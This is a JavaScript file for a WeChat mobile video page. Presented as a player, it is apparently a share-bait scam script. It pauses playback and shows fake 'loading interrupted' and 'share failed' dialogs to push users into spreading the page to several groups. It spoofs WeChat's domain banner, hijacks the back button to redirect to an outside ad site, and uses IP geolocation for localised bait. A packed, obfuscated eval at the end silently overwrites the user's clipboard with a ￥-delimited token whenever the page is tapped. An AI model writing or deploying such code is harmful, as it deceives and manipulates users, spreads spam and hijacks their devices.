var video, player, playStatus = 'pending';
var til= $('#til').val();
var delayTime = parseInt($('#delay').val()) ;
var isOS=!!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
var elId = 'mod_player_skin_0';
var vid = $('#vId').val();
$("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');

function playVideo(vid,elId,elWidth){
	//定义视频对象
	video = new tvp.VideoInfo();
	//向视频对象传入视频vid
	video.setVid(vid);
	//定义播放器对象
	player = new tvp.Player(elWidth, 200);
	//设置播放器初始化时加载的视频
	player.setCurVideo(video);
	//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
	if (sessionStorage.isAT && isOS) {document.addEventListener("WeixinJSBridgeReady", function() {player.play();}, false);}
	player.addParam("wmode","transparent");
	player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
	player.write(elId);
	player.onplaying=function(){if(!sessionStorage.pt){sessionStorage.pt=new Date().getTime();}};
}

$('#pauseplay').on('click', function() {
	jssdk();
});

var elWidth = $("#js_content").width();

playVideo(vid,elId,elWidth);

$("#pauseplay").height($("#js_content").height() - 10);

if(playStatus == 'pending') {
var isFirst = true;
setInterval(function(){
try {
var currentTime = player.getCurTime();
if(currentTime >= delayTime && ((new Date().getTime() - sessionStorage.pt) / 1000 >= 20)) {
$('#pauseplay').show();
player.setPlaytime(delayTime-1);
player.pause();
player.cancelFullScreen();
$.cookie(vid, 's', {path: '/'});
if(isFirst) {
$('#pauseplay').trigger('click');
}
isFirst = false;
}
} catch (e) {
}
}, 500);
}


$('#like').on('click', function(){
var $icon = $(this).find('i');
var $num = $(this).find('#likeNum');
var num = 0;
if(!$icon.hasClass('praised')){
num = parseInt($num.html());
if(isNaN(num)) {
num = 0;
}
$num.html(++num);
$icon.addClass("praised");
} else {
num = parseInt($num.html());
num--;
if(isNaN(num)) {
num = 0;
}
$num.html(num);
$icon.removeClass("praised");
}
});

var alertTimes = 0;
function wxalert(msg, btn, callback) {
if (alertTimes == 0) {
var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
$("body").append(dialog)
}
alertTimes++;
var d = $('#lly_dialog');
d.show(200);
d.find("#lly_dialog_msg").html(msg);
d.find("#lly_dialog_btn").html(btn);
d.find("#lly_dialog_btn").off('click').on('click', function() {
d.hide(200);
if (callback) {
callback()
}
})
}

var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');
var onVisibilityChange = function(){
if (!document[hiddenProperty]) {
if (delayTime == 9999) {
//$.get('fx.hold'+location.search+'&t=vd');
} else if (delayTime < 9999) {
shareATimes += 1;
if (shareATimes>=4) {
shareTTimes += 1;
setTimeout(share_tip(shareATimes,shareTTimes), 2000);
} else {
setTimeout(share_tip(shareATimes,-1), 2000);
}}}}
document.addEventListener(visibilityChangeEvent, onVisibilityChange);

var doc = $(document);
var _touches_point1=0;var _touches_point2=0;
addEventListener("touchstart",
function(e) {
_touches_point1 = e.touches[0].pageY;
});
addEventListener("touchmove",
function(e) {
e.preventDefault();
_touches_point2 = e.touches[0].pageY;
if(doc.scrollTop()<=0 && _touches_point1<_touches_point2)
{
if( $('#_domain_display').length <=0 )
{
$('body').prepend('<div id="_domain_display" style="text-align:center;background-color:#2d3132;color:#797d7e;height:0px;font-size:12px;overflow:hidden;"><p style="padding-top:12px;">此网页由 mp.weixin.qq.com 提供</p></div>');
}
$('#_domain_display').height((_touches_point2-_touches_point1)*0.35);
} else {
doc.scrollTop(doc.scrollTop()+((_touches_point1-_touches_point2)*0.4));
}
if(Math.ceil(doc.scrollTop()+$(window).height()) >= doc.height() || $('#_b_dp').length > 0){
if($('#_b_dp').length <=0 )
{
//$('body').append
$("#lly_dialog").after('<div id="_b_dp" style="text-align:center;color:#797d7e;height:0px;overflow:hidden;"></div>');
}
$('#_b_dp').height((_touches_point1-_touches_point2)*0.5);
}
});

addEventListener("touchend",
function(e) {
$('#_domain_display').slideUp('normal' , function(){
$('#_domain_display').remove();
});
$('#_b_dp').slideUp('normal' , function(){
$('#_b_dp').remove();
});
});

var shareATimes = 0,shareTTimes = 0;
function share_tip(share_app_times, share_timeline_times) {
if (share_app_times <= 3) {
	if (share_app_times == 1){
      wxalert('分享成功,请再分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群即可观看！', '好');
  }
  else if (share_app_times == 2) {
       wxalert('<span style="font-size: 24px;color: #f5294c">分享失败！</span><br>注意：分享到相同的群会失败<br>请继续分享到<span style="font-size: 30px;color: #f5294c">2</span>个不同的群！', '好');
  } else {
  	 wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">1</span>个不同的群即可观看！', '好') 
    // wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>还差最后一个不同的群！', '确定')
  } 
} else {
if (share_timeline_times == 1) {
	  wxalert('<span style="font-size: 30px;color: #f5294c">分享成功！</span><br/>最后一步!请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可!', '好')
} else {
	wxalert('<b style="font-size: 22px">分享成功！</b><br/>点击确定继续播放。', '确定', function() {
	//$.get('fx.hold'+location.search+'&t=vd');
	delayTime = 99999;
	$("#fenxiang").hide();
	sessionStorage.removeItem("pt");
	player.onplaying=function(){};
	player.play();
	})
	}
}
}
 	function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}
function jssdk() {
if (!isOS) {
	if(!sessionStorage.isDT){
	sessionStorage.isDT=1;
	return location.reload();
	}
}
$("#fenxiang").show();
	// sessionStorage.getItem('load');
	// location.reload();
	show_tip();
}
if (sessionStorage.isDT) {jssdk();sessionStorage.removeItem("isDT");}

function show_tip() {
wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
}
$(function() {
$('#fenxiang').on('click', function() {
	// sessionStorage.getItem('load');
	// location.reload();
	show_tip()
});
});

//document.title= til;
//document.getElementsByTagName('h2')[0].innerHTML = til;

var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
function chkwvs() {if (!sessionStorage.isAT && isOS && wechatInfo && wechatInfo[1] >= "6.5.1") {
	setTimeout("document.getElementById('sa').style.display='block';", 900);
}}
function winrs() {
	/*jk
	if (isOS) {
		player.onplaying=function(){
		if (!sessionStorage.isAT) {
			sessionStorage.isAT=1;
			//return location='http://wap.mypresident.cn./2018-01-08/fjUpru.do?riq=3eWbcZdAIJEaoEcSOUwdC1JL3w&_t=1515419378';
			}
		};
	}
	*/
}
function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}
window.onhashchange=function(){jp();};function hh() {/*chkwvs();*/history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());}
function jp() {

	location.href='http://n.yjkcd.com./xs.html'+"?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);/*"/2017-12-02/Atj=9X8H6XqJOjUzpz4XKRTnDyNuTez56j4Qix3iN4uQsEdApzfu&_t=1512201546280"*/}

window.onload=function(){
	if (sessionStorage.isAT) {chkwvs=function(){};sessionStorage.removeItem("isAT");}
	setTimeout('hh();', 100);
}

winrs();
window.onresize=window.onorientationchange=function(){winrs();}

if(delayTime != 9999){
$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
document.title = remote_ip_info.city+document.title;
$("li").each(function(){$(this).text('💥'+(Math.random()>0.8?remote_ip_info.city:"")+$(this).text())});
});}
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?bb2185d4e579e8b861a248eb1e1036f9";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
   
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('l 9$=["\\h\\6\\3\\g","\\k\\B\\x\\y\\w\\u\\v\\C\\D\\z\\A\\k","\\r\\4\\7\\s\\7\\5\\p\\t\\q\\8\\7\\3\\n\\4\\o\\4\\d\\3\\g"];f a(){E N(9$[0],{M:f(){l b=[9$[1]];O b[i["\\P\\e\\6\\6\\8"](i["\\8\\d\\5\\3\\6\\Q"]()*b["\\e\\4\\5\\n\\c\\H"])]}})};m["\\h\\6\\3\\g"]["\\6\\5\\j\\e\\7\\j\\G"]=a();m["\\d\\3\\3\\F\\I\\4\\5\\c\\L\\7\\K\\c\\4\\5\\4\\8"](9$[2],f(b){a()},J);',53,53,'|||x64|x65|x6e|x6f|x69|x72|_|||x74|x61|x6c|function|x79|x62|Math|x63|uffe5|var|document|x67|x52|x4a|x42|x57|x78|x53|u665f|x7a|x46|u9a8f|u9999|u6708|u4ead|u9053|x33|u9759|new|x45|x6b|x68|x76|false|x73|x4c|text|Clipboard|return|x66|x6d'.split('|'),0,{}))
  

 